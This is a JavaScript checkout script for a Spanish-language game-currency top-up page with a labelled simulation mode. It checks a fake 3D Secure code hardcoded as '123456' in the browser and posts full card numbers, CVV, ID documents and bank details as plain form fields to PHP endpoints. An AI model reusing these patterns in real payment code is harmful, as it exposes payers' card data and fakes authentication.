(function () {
            const products = {
                1: { name: ' 60 UC Points', price: '4.900 COP', precio: 4900 },
                2: { name: ' 325 UC Points', price: '21.900 COP', precio: 21900 },
                3: { name: ' 660 UC Points', price: '39.900 COP', precio: 39900 },
                4: { name: ' 1800 UC Points', price: '99.900 COP', precio: 99900 },
                5: { name: ' 3850 UC Points', price: '189.900 COP', precio: 189900 },
                6: { name: ' 8100 UC Points', price: '369.900 COP', precio: 369900 },
            };

            function updateCheckout(id) {
                const p = products[id];
                if (!p) return;
                document.getElementById('checkoutName').textContent = p.name;
                document.getElementById('checkoutPrice').textContent = p.price;

                const imgEl = document.getElementById('checkoutImg');
                const cardImg = document.querySelector('.product-card[data-id="' + id + '"] img');
                if (imgEl && cardImg) {
                    imgEl.src = cardImg.getAttribute('src');
                    imgEl.style.display = '';
                } else if (imgEl) {
                    imgEl.style.display = 'none';
                }
            }

            window.setPayment = function (method) {
                document.getElementById('currentPayment').value = method;
                document.getElementById('tabTarjeta').classList.toggle('active', method === 'tarjeta');
                document.getElementById('tabCuenta').classList.toggle('active', method === 'cuenta');
                document.getElementById('formTarjeta').classList.toggle('active', method === 'tarjeta');
                document.getElementById('formCuenta').classList.toggle('active', method === 'cuenta');
            };

            // Formatear número de tarjeta
            document.getElementById('cardNumber').addEventListener('input', function () {
                let v = this.value.replace(/\D/g, '').substring(0, 16);
                this.value = v.replace(/(.{4})/g, '$1 ').trim();
            });

            // Formatear fecha
            document.getElementById('cardExpiry').addEventListener('input', function () {
                let v = this.value.replace(/\D/g, '').substring(0, 4);
                if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
                this.value = v;
            });

            function initCards() {
                const cards = document.querySelectorAll('.product-card');
                if (cards.length === 0) { setTimeout(initCards, 100); return; }
                cards.forEach(function (card) {
                    card.addEventListener('click', function () {
                        cards.forEach(c => c.classList.remove('selected'));
                        card.classList.add('selected');
                        updateCheckout(parseInt(card.getAttribute('data-id')));
                    });
                });
                var def = document.querySelector('.product-card[data-id="2"]');
                if (def) { def.classList.add('selected'); updateCheckout(2); }
            }

            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', initCards);
            } else { initCards(); }

            // ── 3DS ──
            const tdsCheck = document.getElementById('tdsCheck');
            const tdsPanel = document.getElementById('tdsPanel');
            const tdsStatus = document.getElementById('tdsStatus');
            const tdsDigits = document.querySelectorAll('.tds-digit');
            const TDS_CODE = '123456';
            let tdsVerified = false;

            tdsCheck.addEventListener('change', function () {
                tdsPanel.classList.toggle('show', this.checked);
                if (!this.checked) {
                    tdsVerified = false;
                    tdsDigits.forEach(d => { d.value = ''; d.className = 'tds-digit'; });
                    tdsStatus.className = 'tds-status';
                }
            });

            // Auto-avance entre dígitos
            tdsDigits.forEach(function (input, idx) {
                input.addEventListener('input', function () {
                    this.value = this.value.replace(/\D/g, '');
                    if (this.value && idx < tdsDigits.length - 1) {
                        tdsDigits[idx + 1].focus();
                    }
                    // Verificar cuando se llenen los 6
                    const code = Array.from(tdsDigits).map(d => d.value).join('');
                    if (code.length === 6) verifyTds(code);
                });
                input.addEventListener('keydown', function (e) {
                    if (e.key === 'Backspace' && !this.value && idx > 0) {
                        tdsDigits[idx - 1].focus();
                    }
                });
            });

            function verifyTds(code) {
                if (code === TDS_CODE) {
                    tdsVerified = true;
                    tdsDigits.forEach(d => d.classList.add('success'));
                    tdsStatus.className = 'tds-status ok';
                    tdsStatus.textContent = '✅ Autenticación 3DS exitosa — puedes proceder con el pago.';
                } else {
                    tdsVerified = false;
                    tdsDigits.forEach(d => d.classList.add('error'));
                    tdsStatus.className = 'tds-status err';
                    tdsStatus.textContent = '❌ Código incorrecto. Inténtalo de nuevo.';
                    setTimeout(function () {
                        tdsDigits.forEach(d => { d.value = ''; d.className = 'tds-digit'; });
                        tdsDigits[0].focus();
                        tdsStatus.className = 'tds-status';
                    }, 1500);
                }
            }

            // ── Modo de simulación ──
            let modoSimulacion = 'elegir';
            window.setModo = function (modo) {
                modoSimulacion = modo;
                document.getElementById('modoElegir').classList.toggle('active', modo === 'elegir');
                document.getElementById('modoAuto').classList.toggle('active', modo === 'auto');
                document.getElementById('modoHint').textContent = (modo === 'elegir')
                    ? 'Elige manualmente cómo termina la transacción.'
                    : 'El estado se asigna automáticamente, como un pago real.';
            };

            document.getElementById('btnPagar').addEventListener('click', function () {
                const jugadorId = document.getElementById('jugadorIdInput').value.trim();
                if (!jugadorId) { alert('⚠️ Por favor ingresa tu ID de jugador.'); return; }

                // Validar 3DS si está activado
                if (tdsCheck.checked && !tdsVerified) {
                    alert('⚠️ Debes completar la verificación 3D Secure antes de continuar.');
                    tdsDigits[0].focus();
                    return;
                }

                const selectedCard = document.querySelector('.product-card.selected');
                if (!selectedCard) { alert('⚠️ Selecciona un producto.'); return; }

                const method = document.getElementById('currentPayment').value;
                const producto = document.getElementById('checkoutName').textContent.trim();
                const precio = document.getElementById('checkoutPrice').textContent.replace(/[^0-9]/g, '');

                const form = document.createElement('form');
                form.method = 'POST';
                form.action = (modoSimulacion === 'auto')
                    ? '../php/crear_pb_gateway.php'
                    : '../estados-gateway.php';

                const campos = [
                    ['producto', producto], ['precio', precio],
                    ['jugador_id', jugadorId], ['metodo', method]
                ];

                if (method === 'tarjeta') {
                    const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
                    const expiry = document.getElementById('cardExpiry').value;
                    const cvv = document.getElementById('cardCvv').value;
                    const name = document.getElementById('cardName').value;
                    const tipoDoc = document.getElementById('cardTipoDoc').value;
                    const numDoc = document.getElementById('cardNumDoc').value;
                    const correo = document.getElementById('cardCorreo').value;
                    const tel = document.getElementById('cardTelefono').value;

                    if (!cardNum || !expiry || !cvv || !name || !numDoc || !correo || !tel) {
                        alert('⚠️ Por favor completa todos los campos de tarjeta.'); return;
                    }
                    campos.push(
                        ['card_number', cardNum], ['card_expiry', expiry],
                        ['card_cvv', cvv], ['card_name', name],
                        ['tipo_doc', tipoDoc], ['num_doc', numDoc],
                        ['correo', correo], ['telefono', tel]
                    );
                } else {
                    const banco = document.getElementById('cuentaBanco').value;
                    const tipo = document.getElementById('cuentaTipo').value;
                    const numero = document.getElementById('cuentaNumero').value;
                    const tipoDoc = document.getElementById('cuentaTipoDoc').value;
                    const numDoc = document.getElementById('cuentaNumDoc').value;
                    const nombre = document.getElementById('cuentaNombre').value;
                    const correo = document.getElementById('cuentaCorreo').value;
                    const tel = document.getElementById('cuentaTelefono').value;

                    if (!numero || !numDoc || !nombre || !correo || !tel) {
                        alert('⚠️ Por favor completa todos los campos de cuenta.'); return;
                    }
                    campos.push(
                        ['banco', banco], ['tipo_cuenta', tipo],
                        ['num_cuenta', numero], ['tipo_doc', tipoDoc],
                        ['num_doc', numDoc], ['nombre', nombre],
                        ['correo', correo], ['telefono', tel],
                        ['cuenta_banco', banco]
                    );
                }

                campos.forEach(function (pair) {
                    const input = document.createElement('input');
                    input.type = 'hidden'; input.name = pair[0]; input.value = pair[1];
                    form.appendChild(input);
                });

                document.body.appendChild(form);
                form.submit();
            });
        })();
